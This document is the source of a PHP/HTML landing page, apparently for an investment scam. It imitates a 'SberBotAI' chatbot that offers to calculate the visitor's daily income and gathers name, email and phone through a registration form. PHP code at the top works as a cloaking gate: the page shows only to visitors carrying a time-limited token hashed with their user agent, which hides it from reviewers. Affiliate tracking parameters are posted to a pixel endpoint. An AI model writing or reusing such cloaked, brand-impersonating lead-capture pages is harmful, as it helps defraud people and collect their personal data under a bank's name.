<?php
$key = "fb36c82fcfa2";
$lpKey = "";

if (isset($_GET["lp_key"])) {
    $lpKey = $_GET["lp_key"];
}

if ($lpKey === "") {
    exit(0);
}
$partOneTime = substr($lpKey, 0, 5);
$partTwoTime = substr($lpKey, -5);
$chekKey = substr($lpKey, 5, -5);
$timestamp = sprintf("%s%s", $partOneTime, $partTwoTime);

if (time() > (int) $timestamp) {
    exit(0);
}
$res = md5($key . $_SERVER["HTTP_USER_AGENT"]);
if ($chekKey !== $res) {
    exit(0);
}

function clean($data)
{
    return htmlspecialchars(stripslashes(trim($data)));
}

// Список ожидаемых параметров для APK
$params = [
    'sub1',
    'traffic_source_name',
    'rule_name',
    'offer_name',
    'appId', // добавлен новый параметр
    'gaid',  // добавлен новый параметр
    'sid',   // добавлен новый параметр
    'ad_ext', // добавлен новый параметр
    'offer_id',
    'traffic_source_id',
    'path_name'
];

// Массив для хранения очищенных параметров
$cleanedParams = [];

// Перебор параметров и их очистка
foreach ($params as $param) {
    $cleanedParams[$param] = clean($_GET[$param] ?? '');
}


// Установка фиксированного значения для campaing_id
$cleanedParams['campaing_id'] = $cleanedParams['path_name'];
?>
<!DOCTYPE html>
<html lang="en" class="add-scroll">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="css/style.css">
    <link href="css2" rel="stylesheet">
    <title>SberBotAI</title>
    <link rel="stylesheet" href="css/animate.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"
        integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g=="
        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.js"
        integrity="sha512-+k1pnlgt4F1H8L7t3z95o3/KO+o78INEcXTbnoJQ/F2VqDVhWoaiVml/OEHv9HsVgxUaVW+IbiZPUJQfF/YxZw=="
        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/19.2.16/css/intlTelInput.css"
        integrity="sha512-1fzvDP5eqhbc1j8H77kf7tBpz+lRlD+vTOuXz/A58/HcBUyH4BaJeo+xSyhE0Mo1V8JRSnAg5smJhkZo93EZOw=="
        crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link rel="stylesheet" href="style.css" />
    <script type="text/javascript">
        var php_var = <?php echo json_encode($cleanedParams); ?>;

        function sendRequestToBpix(params) {
            // Путь к вашему файлу bpix.php
            const url = "bpix.php";

            // Отправка POST-запроса
            fetch(url, {
                method: "POST",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                },
                body: new URLSearchParams(params),
            })
                .then((response) => {
                    if (!response.ok) {
                        throw new Error("Network response was not ok");
                    }
                    return response.text(); // Или response.json(), если ожидается JSON
                })
                .then((data) => {
                    console.log(data); // Обработка полученных данных
                })
                .catch((error) => {
                    console.error(
                        "There has been a problem with your fetch operation:",
                        error
                    );
                });
        }
    </script>
    <style>
        .pageloader {
            position: fixed;
            left: 0px;
            top: 0px;
            width: 100%;
            height: 100%;
            z-index: 9999;
            background: url('./images/loader.gif') 50% 50% no-repeat rgb(249, 249, 249);
            opacity: .8;
        }
    </style>

    <style>
        .info-label[data-v-5a001972] {
            background-color: #5bc0de;
            border-radius: .25em;
            color: #fff;
            display: inline;
            font-size: 13px;
            font-weight: 500;
            line-height: 13px;
            padding: 3px 7px 4px;
            text-align: center;
            vertical-align: baseline;
            white-space: nowrap
        }

        .glyphicon-refresh-animate[data-v-5a001972] {
            animation: rotate-center-5a001972 .6s ease-in-out infinite both
        }

        @keyframes rotate-center-5a001972 {
            0% {
                transform: rotate(0)
            }

            to {
                transform: rotate(1turn)
            }
        }

        .glyphicon[data-v-5a001972] {
            font-size: 13px
        }
    </style>
    <style>
        .warning-label[data-v-ec8b30bc] {
            background-color: #f0ad4e;
            border-radius: .25em;
            color: #fff;
            display: inline;
            font-size: 13px;
            font-weight: 500;
            line-height: 13px;
            padding: 3px 7px 4px;
            text-align: center;
            vertical-align: baseline;
            white-space: nowrap
        }

        .glyphicon[data-v-ec8b30bc] {
            font-size: 13px
        }
    </style>
    <style>
        .danger-label[data-v-8c649948] {
            background-color: #d9534f;
            border-radius: .25em;
            color: #fff;
            display: inline;
            font-weight: 500;
            line-height: 13px;
            padding: 3px 7px 4px;
            text-align: center;
            vertical-align: baseline;
            white-space: nowrap
        }

        .danger-label[data-v-8c649948],
        .glyphicon[data-v-8c649948] {
            font-size: 13px
        }
    </style>
    <style>
        .success-label[data-v-cbd1beca] {
            background-color: #5cb85c;
            border-radius: .25em;
            color: #fff;
            display: inline;
            font-size: 13px;
            font-weight: 500;
            line-height: 13px;
            padding: 3px 7px 4px;
            text-align: center;
            vertical-align: baseline;
            white-space: nowrap
        }

        .glyphicon-refresh-animate[data-v-cbd1beca] {
            animation: rotate-center-cbd1beca .6s ease-in-out infinite both
        }

        @keyframes rotate-center-cbd1beca {
            0% {
                transform: rotate(0)
            }

            to {
                transform: rotate(1turn)
            }
        }

        .glyphicon[data-v-cbd1beca] {
            font-size: 13px
        }
    </style>
    <style>
        .progressBar[data-v-18a3cf1f] {
            margin: 15px 0
        }
    </style>
    <style>
        .label[data-v-768638a4] {
            border-radius: .25em;
            color: #fff;
            display: inline;
            font-size: 13px;
            font-weight: 500;
            line-height: 1;
            padding: 3px 7px;
            text-align: center;
            vertical-align: baseline;
            white-space: nowrap
        }

        .label-default[data-v-768638a4] {
            background-color: #777
        }

        .label-default[href][data-v-768638a4]:focus,
        .label-default[href][data-v-768638a4]:hover {
            background-color: #5e5e5e
        }

        .label-primary[data-v-768638a4] {
            background-color: #337ab7
        }

        .label-primary[href][data-v-768638a4]:focus,
        .label-primary[href][data-v-768638a4]:hover {
            background-color: #286090
        }

        .label-success[data-v-768638a4] {
            background-color: #5cb85c
        }

        .label-success[href][data-v-768638a4]:focus,
        .label-success[href][data-v-768638a4]:hover {
            background-color: #449d44
        }

        .label-info[data-v-768638a4] {
            background-color: #5bc0de
        }

        .label-info[href][data-v-768638a4]:focus,
        .label-info[href][data-v-768638a4]:hover {
            background-color: #31b0d5
        }

        .label-warning[data-v-768638a4] {
            background-color: #f0ad4e
        }

        .label-warning[href][data-v-768638a4]:focus,
        .label-warning[href][data-v-768638a4]:hover {
            background-color: #ec971f
        }

        .label-danger[data-v-768638a4] {
            background-color: #d9534f
        }

        .label-danger[href][data-v-768638a4]:focus,
        .label-danger[href][data-v-768638a4]:hover {
            background-color: #c9302c
        }
    </style>
    <style>
        .meta-item-img[data-v-0fe20d74] {
            display: inline-block;
            height: 40px;
            margin-right: 5px;
            width: 40px
        }

        .meta-item-img img[data-v-0fe20d74] {
            max-width: 100%;
            position: relative;
            transition: all .5s ease 0s;
            z-index: 99
        }

        .meta-item-img img[data-v-0fe20d74]:hover {
            transform: scale(5)
        }

        .success-label[data-v-0fe20d74] {
            background-color: #5cb85c;
            border-radius: .25em;
            color: #fff;
            display: inline;
            font-size: 11px;
            font-weight: 500;
            line-height: 1;
            padding: .2em .6em .3em;
            text-align: center;
            vertical-align: baseline;
            white-space: nowrap
        }
    </style>
    <style>
        .sku-row[data-v-5dfbb1bb] {
            display: inline-block;
            margin: 10px 10px 0 0
        }

        .sku-row .name[data-v-5dfbb1bb] {
            margin: 0 5px 0 0
        }
    </style>
    <style>
        .meta-item-img[data-v-65721877] {
            cursor: pointer;
            display: inline-block;
            height: 40px;
            margin: 5px;
            text-align: center;
            width: 40px
        }

        .meta-item-img img[data-v-65721877] {
            max-height: 100%;
            max-width: 100%;
            position: relative;
            transition: all .5s ease 0s;
            z-index: 99
        }
    </style>
    <style>
        .m-row[data-v-243d2edf] {
            margin: 10px
        }

        .name[data-v-243d2edf],
        .value[data-v-243d2edf] {
            display: inline-block
        }
    </style>
    <style>
        .row-proceed-variation[data-v-0e777b12] {
            display: flex;
            justify-content: space-between
        }

        .btn[data-v-0e777b12] {
            white-space-collapse: collapse;
            text-wrap: nowrap;
            background-image: none;
            border: 1px solid transparent;
            -o-border-image: initial;
            border-image: initial;
            border-radius: 4px;
            cursor: pointer;
            display: inline-block;
            font-size: 14px;
            font-weight: 400;
            line-height: 1.42857;
            margin-bottom: 0;
            padding: 6px 12px;
            text-align: center;
            touch-action: manipulation;
            -webkit-user-select: none;
            -moz-user-select: none;
            user-select: none;
            vertical-align: middle
        }

        .btn-success[data-v-0e777b12] {
            background-color: #5cb85c;
            border-color: #4cae4c;
            color: #fff;
            flex: 1
        }

        .btn-default[data-v-0e777b12] {
            background-color: #fff;
            border-color: #ccc;
            color: #333;
            margin-left: 30px;
            width: 200px
        }

        .row-product-settings[data-v-0e777b12] {
            margin: 0 0 20px
        }
    </style>
    <style>
        .row-product[data-v-601055ae] {
            display: flex
        }

        .row-product .product-img[data-v-601055ae] {
            padding: 0 10px;
            width: 140px
        }

        .row-product .product-img img[data-v-601055ae] {
            background-color: #fff;
            border: 1px solid #ddd;
            -o-border-image: initial;
            border-image: initial;
            border-radius: 4px;
            display: inline-block;
            height: auto;
            line-height: 1.42857;
            max-width: 100%;
            padding: 4px;
            transition: all .2s ease-in-out 0s
        }

        .row-product .product-meta[data-v-601055ae] {
            flex: 1;
            padding: 0 10px
        }

        .row-product .product-meta .title a[data-v-601055ae] {
            color: #337ab7;
            text-decoration: none
        }

        .row-product .product-meta .title a[data-v-601055ae]:hover {
            color: #23527c;
            text-decoration: underline
        }

        .row-product .product-status[data-v-601055ae] {
            padding: 0 20px;
            width: 220px
        }
    </style>
    <style>
        .product-list[data-v-7fc6a856] {
            margin: 0 -10px
        }

        .product-list .row-product-head[data-v-7fc6a856] {
            border-bottom: 1px solid #e4e4e4;
            display: flex;
            font-size: 14px;
            font-weight: 700;
            justify-content: space-between;
            margin: 0 0 10px;
            overflow: hidden;
            padding-bottom: 5px
        }

        .product-list .col-product[data-v-7fc6a856] {
            flex: 1;
            padding: 0 10px
        }

        .product-list .col-status[data-v-7fc6a856] {
            padding: 0 10px;
            width: 220px
        }
    </style>
    <style>
        .help-label[data-v-f8a5eb04] {
            color: #737373;
            font-size: 10px;
            font-style: italic;
            margin: -5px 0 10px
        }

        .comment[data-v-f8a5eb04] {
            background-color: #eee;
            background-image: none;
            border: 1px solid #ccc;
            -o-border-image: initial;
            border-image: initial;
            border-radius: 4px;
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075);
            color: #555;
            cursor: not-allowed;
            display: block;
            font-size: 14px;
            height: auto;
            line-height: 1.42857;
            opacity: 1;
            padding: 6px 12px;
            transition: border-color .15s ease-in-out 0s, box-shadow .15s ease-in-out 0s;
            width: 100%
        }

        .messagesInfo[data-v-f8a5eb04] {
            margin: 10px 0
        }

        .info-label[data-v-f8a5eb04] {
            background-color: #5bc0de;
            border-radius: .25em;
            display: inline;
            font-size: 75%;
            font-weight: 700;
            line-height: 1;
            padding: .2em .6em .3em;
            vertical-align: baseline;
            white-space: nowrap
        }

        .btn[data-v-f8a5eb04],
        .info-label[data-v-f8a5eb04] {
            color: #fff;
            text-align: center
        }

        .btn[data-v-f8a5eb04] {
            white-space-collapse: collapse;
            text-wrap: nowrap;
            background-color: #337ab7;
            background-image: none;
            border: 1px solid #2e6da4;
            -o-border-image: initial;
            border-image: initial;
            border-radius: 4px;
            cursor: pointer;
            display: inline-block;
            font-size: 14px;
            font-weight: 400;
            line-height: 1.42857;
            margin-bottom: 0;
            padding: 6px 12px;
            touch-action: manipulation;
            -webkit-user-select: none;
            -moz-user-select: none;
            user-select: none;
            vertical-align: middle
        }

        .btn-primary[data-v-f8a5eb04]:active,
        .btn-primary[data-v-f8a5eb04]:hover {
            background-color: #286090;
            border-color: #204d74;
            color: #fff
        }

        .link[data-v-f8a5eb04] {
            color: #337ab7;
            text-decoration: none
        }

        .link[data-v-f8a5eb04]:hover {
            color: #23527c;
            text-decoration: underline
        }

        .v-overlay-container[data-v-f8a5eb04] {
            contain: layout;
            display: contents;
            position: absolute
        }

        .v-overlay[data-v-f8a5eb04],
        .v-overlay-container[data-v-f8a5eb04] {
            left: 0;
            pointer-events: none;
            top: 0
        }

        .v-overlay[data-v-f8a5eb04] {
            align-items: center;
            border-radius: inherit;
            bottom: 0;
            display: flex;
            justify-content: center;
            margin: auto;
            position: fixed;
            right: 0;
            z-index: 99999
        }

        .modal-fulfill[data-v-f8a5eb04] {
            contain: layout;
            display: flex;
            flex-direction: column;
            margin: 24px;
            max-height: calc(100% - 48px);
            max-width: calc(100% - 48px);
            outline: none;
            pointer-events: auto;
            position: absolute;
            width: 900px
        }

        .modal-overlay[data-v-f8a5eb04] {
            background: #adadad;
            border-radius: inherit;
            bottom: 0;
            left: 0;
            opacity: .32;
            pointer-events: auto;
            position: fixed;
            right: 0;
            top: 0;
            z-index: 9999
        }

        .modal-card[data-v-f8a5eb04] {
            --v-scrollbar-offset: 0px;
            background: #fff;
            border-color: rgba(var(--v-border-color), var(--v-border-opacity));
            border-radius: 4px;
            border-style: solid;
            border-width: 0;
            box-shadow: 0 11px 15px -7px var(--v-shadow-key-umbra-opacity, rgba(0, 0, 0, .2)), 0 24px 38px 3px var(--v-shadow-key-penumbra-opacity, rgba(0, 0, 0, .14)), 0 9px 46px 8px var(--v-shadow-key-penumbra-opacity, rgba(0, 0, 0, .12));
            display: flex;
            flex-direction: column;
            overflow: hidden;
            overflow-wrap: break-word;
            overflow-y: auto;
            padding: 0;
            position: relative;
            text-decoration: none;
            transition-duration: .28s;
            transition-property: box-shadow, opacity, background;
            transition-timing-function: cubic-bezier(.4, 0, .2, 1);
            z-index: 0
        }

        .modal-title[data-v-f8a5eb04] {
            word-wrap: break-word;
            display: block;
            flex: none;
            font-size: 1.25rem;
            font-weight: 500;
            -webkit-hyphens: auto;
            hyphens: auto;
            letter-spacing: .0125em;
            line-height: 2rem;
            min-width: 0;
            overflow: hidden;
            overflow-wrap: normal;
            padding: .5rem 1rem;
            text-overflow: ellipsis;
            text-transform: none;
            white-space: nowrap;
            word-break: normal
        }

        .modal-text[data-v-f8a5eb04] {
            flex: 1 1 auto;
            font-size: inherit;
            font-weight: 400;
            letter-spacing: .03125em;
            line-height: inherit;
            padding: 16px 24px 10px;
            text-transform: none
        }
    </style>
</head>

<body class="expansion-alids-init add-scroll" data-new-gr-c-s-check-loaded="14.1131.0" data-gr-ext-installed="">
    <div class="pageloader"></div>
    <div class="dialog_wrapper">
        <div class="sidebar">
            <h1>Чаты</h1>
            <div class="correspondence_wrapper">
                <div class="correspondence_block">
                    <div class="center">
                        <img src="images/chatbot.png">
                    </div>
                </div>
                <div class="correspondence_block">
                    <h2>SberBotAI</h2>
                    <h4 id="newmessage">Могу ли я рассчитать ваш средний дневной доход?</h4>
                    <h5 id="messagedata">12:36</h5>
                </div>
            </div>
        </div>
        <div class="container">
            <header>
                <div class="botavatar_wrapper">
                    <div class="avatar">
                        <img src="images/chatbot.png">
                    </div>
                    <div class="username_wrapper">
                        <div class="center">
                            <div class="user_info">
                                <h3>SberBotAI</h3>
                                <p>Online</p>
                            </div>
                        </div>
                    </div>
                    <div class="menu">
                        <button>
                            <div class="center">
                                <img src="images/menu.png">
                            </div>
                        </button>
                    </div>
                </div>
            </header>
            <main id="dialog">
                <h4 class="today">Сегодня</h4>
                <form id="registrationForm" style="display: none;"
                    class="animate__animated animate__fadeIn registrationForm">
                    <div>
                        <label for="firstName">Имя:</label>
                        <input type="text" id="firstName" name="firstName" autocomplete="off" />
                        <div id="errorFirstName" class="error-msg"></div>
                    </div>
                    <div>
                        <label for="lastName">Фамилия:</label>
                        <input type="text" id="lastName" name="lastName" autocomplete="off" />
                        <div id="errorLastName" class="error-msg"></div>
                    </div>
                    <div>
                        <label for="email">Email:</label>
                        <input type="email" id="email" name="email" />
                        <div id="errorEmail" class="error-msg"></div>
                    </div>
                    <div style="width: 100%;">
                        <label for="phone">Номер телефона:</label>
                        <input type="tel" id="phone" name="phone" placeholder="(912) 345-67-89"
                            style="padding-left: 90px;" autocomplete="off" />
                        <div id="errorPhone" class="error-msg"></div>
                    </div>
                    <button id="rgbtm" type="submit">Завершить регистрацию</button>
                </form>
            </main>
        </div>
    </div>

    <img src="images/back2.png" class="background">
    <script src="js/dialogs.js"></script>

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/2.1.4/toastr.css" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/2.1.4/toastr.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/19.2.16/js/intlTelInput.min.js" 
            integrity="sha512-tQrytjffTXGE0heMrlh/rf9L8dP96U5U7lrZDDGo3DlxQ+N2ORA3Q4i1+s7ogrxdsGyhXxi4BJwvvJgEpHMKXQ==" 
            crossorigin="anonymous" referrerpolicy="no-referrer"></script></script>
    <script src="mailcheck.min.js"></script>
    <script src="script.js"></script>

    <script>
        $(document).ready(function () {
            // Скрываем загрузчик, когда DOM полностью загружен
            sendRequestToBpix({
            appId: php_var.appId,
            gaid: php_var.gaid,
            sid: php_var.sid,
            mappedIae: "app_install",
            ad_ext: php_var.ad_ext,
            });
            $(".pageloader").hide();
        });
    </script>
</body>

</html>